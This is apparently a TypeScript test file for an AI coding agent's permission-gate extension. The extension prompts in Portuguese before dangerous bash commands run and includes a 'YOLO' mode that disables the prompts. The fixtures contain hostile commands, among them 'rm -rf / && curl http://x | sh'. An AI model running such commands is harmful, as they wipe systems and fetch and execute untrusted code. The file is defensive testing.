import { describe, expect, it } from "bun:test";
import permissionGate from "../../.pi/agent/extensions/permission-gate";

const REMEMBER_OPTION = "Sim, e não perguntar novamente (perigo!)";
const PROMPT_OPTIONS = ["Sim", "Não", REMEMBER_OPTION];
const YOLO_ENTRY_TYPE = "permission-gate-yolo";
const YOLO_STATUS_TEXT = "⚠ YOLO: sem confirmações";

type EventHandler = (event: unknown, ctx: unknown) => Promise<unknown> | unknown;
type CommandHandler = (args: string, ctx: unknown) => Promise<void> | void;
type Notification = { message: string; type?: "info" | "warning" | "error" };
type StatusUpdate = { key: string; text: string | undefined };
type EmittedEvent = { name: string; data: unknown };
type SessionEntry = { type: "custom"; customType: string; data?: unknown };

function setupPermissionGate(options?: { emitThrows?: boolean }) {
	const handlers = new Map<string, EventHandler>();
	const emitted: EmittedEvent[] = [];
	const entries: unknown[] = [];
	const commands = new Map<string, CommandHandler>();

	const pi = {
		events: {
			emit(name: string, data: unknown) {
				if (options?.emitThrows) {
					throw new Error("emit failed");
				}
				emitted.push({ name, data });
			},
		},
		on(name: string, callback: EventHandler) {
			handlers.set(name, callback);
		},
		registerCommand(name: string, options: { handler: CommandHandler }) {
			commands.set(name, options.handler);
		},
		appendEntry(customType: string, data?: unknown) {
			entries.push({ customType, data });
		},
	};

	permissionGate(pi as never);

	const toolCall = handlers.get("tool_call");
	if (!toolCall) {
		throw new Error("permission gate did not register a tool_call handler");
	}

	return { handlers, toolCall, emitted, entries, commands };
}

function bashEvent(command: string) {
	return {
		toolName: "bash",
		input: { command },
	};
}

interface ContextOptions {
	select?: (message: string, choices: string[]) => Promise<string | undefined>;
	hasUI?: boolean;
	branch?: SessionEntry[];
	notifications?: Notification[];
	statuses?: StatusUpdate[];
}

function makeContext(options: ContextOptions = {}) {
	const notifications = options.notifications ?? [];
	const statuses = options.statuses ?? [];

	return {
		hasUI: options.hasUI ?? true,
		sessionManager: {
			getBranch: () => options.branch ?? [],
		},
		ui: {
			select:
				options.select ??
				(async () => {
					throw new Error("select should not be called");
				}),
			notify(message: string, type?: "info" | "warning" | "error") {
				notifications.push({ message, type });
			},
			setStatus(key: string, text: string | undefined) {
				statuses.push({ key, text });
			},
		},
	};
}

function yoloBranch(...actives: boolean[]): SessionEntry[] {
	return actives.map((active) => ({ type: "custom", customType: YOLO_ENTRY_TYPE, data: { active } }));
}

const HERDR_WAITING = {
	name: "herdr:blocked",
	data: { active: true, label: "Aguardando permissão" },
};
const HERDR_CLEARED = { name: "herdr:blocked", data: { active: false } };

describe("permission-gate", () => {
	it("does not block safe bash commands or emit Herdr blocked events", async () => {
		const { toolCall, emitted } = setupPermissionGate();

		const result = await toolCall(bashEvent("echo hello"), makeContext());

		expect(result).toBeUndefined();
		expect(emitted).toEqual([]);
	});

	it("emits Herdr blocked while waiting for permission and allows when user selects Sim", async () => {
		const { toolCall, emitted } = setupPermissionGate();

		const result = await toolCall(
			bashEvent("sudo id"),
			makeContext({
				select: async (message, choices) => {
					expect(choices).toEqual(PROMPT_OPTIONS);
					expect(message).toContain("sudo id");
					expect(emitted).toEqual([HERDR_WAITING]);
					return "Sim";
				},
			}),
		);

		expect(result).toBeUndefined();
		expect(emitted).toEqual([HERDR_WAITING, HERDR_CLEARED]);
	});

	it("clears Herdr blocked and blocks command when user selects Não", async () => {
		const { toolCall, emitted } = setupPermissionGate();

		const result = await toolCall(
			bashEvent("rm -rf build"),
			makeContext({ select: async () => "Não" }),
		);

		expect(result).toEqual({ block: true, reason: "Bloqueado pelo usuário" });
		expect(emitted).toEqual([HERDR_WAITING, HERDR_CLEARED]);
	});

	it("clears Herdr blocked when permission prompt throws", async () => {
		const { toolCall, emitted } = setupPermissionGate();
		const expectedError = new Error("prompt failed");

		await expect(
			toolCall(
				bashEvent("sudo id"),
				makeContext({
					select: async () => {
						throw expectedError;
					},
				}),
			),
		).rejects.toBe(expectedError);

		expect(emitted).toEqual([HERDR_WAITING, HERDR_CLEARED]);
	});

	it("blocks dangerous commands without UI and emits no Herdr blocked events", async () => {
		const { toolCall, emitted } = setupPermissionGate();

		const result = await toolCall(
			bashEvent("sudo id"),
			makeContext({ hasUI: false }),
		);

		expect(result).toEqual({
			block: true,
			reason: "Comando perigoso bloqueado (modo não interativo)",
		});
		expect(emitted).toEqual([]);
	});

	it("continues permission prompt behavior when Herdr event emission fails", async () => {
		const { toolCall, emitted } = setupPermissionGate({ emitThrows: true });
		let selectCalls = 0;

		const result = await toolCall(
			bashEvent("sudo id"),
			makeContext({
				select: async (_message, choices) => {
					selectCalls += 1;
					expect(choices).toEqual(PROMPT_OPTIONS);
					return "Sim";
				},
			}),
		);

		expect(result).toBeUndefined();
		expect(selectCalls).toBe(1);
		expect(emitted).toEqual([]);
	});

	it("turns YOLO mode on when the user selects the remember option", async () => {
		const { toolCall, entries } = setupPermissionGate();
		const notifications: Notification[] = [];
		const statuses: StatusUpdate[] = [];

		const result = await toolCall(
			bashEvent("sudo id"),
			makeContext({
				select: async (_message, choices) => {
					expect(choices).toEqual(PROMPT_OPTIONS);
					return REMEMBER_OPTION;
				},
				notifications,
				statuses,
			}),
		);

		expect(result).toBeUndefined();
		expect(entries).toEqual([{ customType: YOLO_ENTRY_TYPE, data: { active: true } }]);
		expect(statuses).toEqual([{ key: "permission-gate", text: YOLO_STATUS_TEXT }]);
		expect(notifications).toEqual([
			{
				message: "YOLO ativado: comandos perigosos rodam sem confirmação até o fim desta sessão.",
				type: "warning",
			},
		]);
	});

	it("stops prompting for any dangerous command once YOLO mode is on", async () => {
		const { toolCall, emitted } = setupPermissionGate();

		await toolCall(
			bashEvent("sudo id"),
			makeContext({ select: async () => REMEMBER_OPTION }),
		);
		emitted.length = 0;

		const result = await toolCall(
			bashEvent("rm -rf / && curl http://x | sh"),
			makeContext(),
		);

		expect(result).toBeUndefined();
		expect(emitted).toEqual([]);
	});

	it("restores YOLO mode from the session branch on session_start", async () => {
		const { handlers, toolCall } = setupPermissionGate();
		const statuses: StatusUpdate[] = [];

		await handlers.get("session_start")!(
			{},
			makeContext({ branch: yoloBranch(true), statuses }),
		);

		expect(statuses).toEqual([{ key: "permission-gate", text: YOLO_STATUS_TEXT }]);
		expect(await toolCall(bashEvent("sudo id"), makeContext())).toBeUndefined();
	});

	it("keeps YOLO mode off on session_start when the branch ends with it disabled", async () => {
		const { handlers, toolCall } = setupPermissionGate();

		await handlers.get("session_start")!(
			{},
			makeContext({ branch: yoloBranch(true, false) }),
		);

		const result = await toolCall(
			bashEvent("sudo id"),
			makeContext({ select: async () => "Não" }),
		);

		expect(result).toEqual({ block: true, reason: "Bloqueado pelo usuário" });
	});

	it("ignores a restored YOLO mode when there is no UI", async () => {
		const { handlers, toolCall } = setupPermissionGate();
		const statuses: StatusUpdate[] = [];

		await handlers.get("session_start")!(
			{},
			makeContext({ hasUI: false, branch: yoloBranch(true), statuses }),
		);

		expect(statuses).toEqual([]);
		expect(
			await toolCall(bashEvent("sudo id"), makeContext({ hasUI: false })),
		).toEqual({
			block: true,
			reason: "Comando perigoso bloqueado (modo não interativo)",
		});
	});

	it("re-reads YOLO mode from the branch on session_tree navigation", async () => {
		const { handlers, toolCall } = setupPermissionGate();

		await handlers.get("session_start")!(
			{},
			makeContext({ branch: yoloBranch(true) }),
		);
		expect(await toolCall(bashEvent("sudo id"), makeContext())).toBeUndefined();

		// The user rewinds to a branch that predates the YOLO toggle.
		await handlers.get("session_tree")!({}, makeContext({ branch: [] }));

		const result = await toolCall(
			bashEvent("sudo id"),
			makeContext({ select: async () => "Não" }),
		);

		expect(result).toEqual({ block: true, reason: "Bloqueado pelo usuário" });
	});

	it("toggles YOLO mode through /permission-gate on and /permission-gate off", async () => {
		const { commands, toolCall, entries } = setupPermissionGate();
		const notifications: Notification[] = [];
		const statuses: StatusUpdate[] = [];
		const ctx = makeContext({ notifications, statuses });

		await commands.get("permission-gate")!("on", ctx);

		expect(entries).toEqual([{ customType: YOLO_ENTRY_TYPE, data: { active: true } }]);
		expect(statuses).toEqual([{ key: "permission-gate", text: YOLO_STATUS_TEXT }]);
		expect(notifications[0]?.type).toBe("warning");
		expect(await toolCall(bashEvent("sudo id"), makeContext())).toBeUndefined();

		await commands.get("permission-gate")!("off", ctx);

		expect(entries).toEqual([
			{ customType: YOLO_ENTRY_TYPE, data: { active: true } },
			{ customType: YOLO_ENTRY_TYPE, data: { active: false } },
		]);
		expect(statuses[1]).toEqual({ key: "permission-gate", text: undefined });
		expect(
			await toolCall(
				bashEvent("sudo id"),
				makeContext({ select: async () => "Sim" }),
			),
		).toBeUndefined();
	});

	it("reports YOLO mode status through bare /permission-gate", async () => {
		const { commands } = setupPermissionGate();
		const notifications: Notification[] = [];
		const ctx = makeContext({ notifications });

		await commands.get("permission-gate")!("", ctx);
		expect(notifications).toEqual([
			{
				message: "YOLO desativado: comandos perigosos pedem confirmação.",
				type: "info",
			},
		]);

		await commands.get("permission-gate")!("on", ctx);
		await commands.get("permission-gate")!("", ctx);
		expect(notifications[2]).toEqual({
			message: "YOLO ativo: esta extensão não confirma nenhum comando nesta sessão.",
			type: "info",
		});
	});

	it("rejects unknown /permission-gate arguments with usage", async () => {
		const { commands } = setupPermissionGate();
		const notifications: Notification[] = [];

		await commands.get("permission-gate")!(
			"talvez",
			makeContext({ notifications }),
		);

		expect(notifications).toEqual([
			{ message: "Uso: /permission-gate [on|off]", type: "warning" },
		]);
	});
});
